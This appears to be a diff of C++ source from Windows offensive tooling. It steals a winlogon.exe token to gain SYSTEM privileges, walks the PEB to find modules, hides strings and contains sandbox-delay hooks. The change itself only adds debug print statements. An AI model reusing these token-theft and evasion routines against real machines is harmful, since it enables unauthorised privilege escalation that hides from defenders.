@@ -55,14 +55,15 @@ HMODULE ProcessUtilities::GetModHandle(std::string libName)
 
 	PPEB peb = ( PPEB ) GetPebAddress();
 
-	PPEB_LDR_DATA         LDRData = peb->Ldr;
-	LIST_ENTRY* modules = &LDRData->InMemoryOrderModuleList;
-	LIST_ENTRY* nextEntry = modules->Flink;
-	LDR_DATA_TABLE_ENTRY* modInfo = NULL;
+	PPEB_LDR_DATA         LDRData   = peb->Ldr;
+	LIST_ENTRY*           modules   = &LDRData->InMemoryOrderModuleList;
+	LIST_ENTRY*           nextEntry = modules->Flink;
+	LDR_DATA_TABLE_ENTRY* modInfo   = NULL;
 
 	while ( nextEntry != modules ) {
 		modInfo = ( LDR_DATA_TABLE_ENTRY* ) ( ( BYTE* ) nextEntry - sizeof(LIST_ENTRY) ); // get the info
 		nextEntry = nextEntry->Flink; // set the current node to the next node
+		OutputDebugStringA(PWSTRToString(modInfo->FullDllName.Buffer).c_str());
 
 		if ( _sub(_lower(PWSTRToString(modInfo->FullDllName.Buffer)), _lower(libName)) ) {
 			HMODULE mod = ( HMODULE ) modInfo->DllBase;
@@ -71,6 +72,8 @@ HMODULE ProcessUtilities::GetModHandle(std::string libName)
 			return mod;
 		}
 	}
+
+	OutputDebugStringA("didnt find mod");
 
 	return NULL;
 }
@@ -209,6 +212,8 @@ HANDLE ProcessUtilities::CreateProcessAccessToken(DWORD processID) {
 	SysNtClose(process);
 	SysNtClose(processToken);
 
+	OutputDebugStringA("duped");
+
 	return duplicatedToken;
 }
 
@@ -259,6 +264,8 @@ DWORD ProcessUtilities::StartWindowsService(std::string serviceName) {
 		return -1;
 	}
 
+	OutputDebugStringA("good start");
+
 	SERVICE_STATUS_PROCESS status = { 0 };
 	DWORD statusBytesNeeded;
 
@@ -305,6 +312,8 @@ DWORD ProcessUtilities::StartWindowsService(std::string serviceName) {
 	// service is now started
 	SysNtClose(service);
 	SysNtClose(scManager);
+
+	OutputDebugStringA("good pid");
 	return status.dwProcessId;
 }
 
@@ -312,11 +321,15 @@ HANDLE ProcessUtilities::GetSystemToken() {
 	DWORD logonPID = PIDFromName(HIDE("winlogon.exe"));
 	if ( logonPID == 0 ) // bad process id
 		return FALSE;
+	
+	OutputDebugStringA("got winlogon pid");
 
 	//SandboxCompromise::DelayOperation();
 	HANDLE winlogon = CreateProcessAccessToken(logonPID);
 	if ( winlogon == NULL )
 		return NULL;
+
+	OutputDebugStringA("got pat");
 
 	HMODULE ntdll = GetLoadedLib(freqDLLS::advapi32);
 	PPROCFN::_ImpersonateLoggedOnUser _ImpersonateLoggedOnUser = GetFunctionAddress<PPROCFN::_ImpersonateLoggedOnUser>(ntdll, std::string(HIDE("ImpersonateLoggedOnUser")));
@@ -325,6 +338,8 @@ HANDLE ProcessUtilities::GetSystemToken() {
 		SysNtClose(winlogon);
 		return NULL;
 	}
+
+	OutputDebugStringA("good");
 
 	//SandboxCompromise::DelayOperation();
 
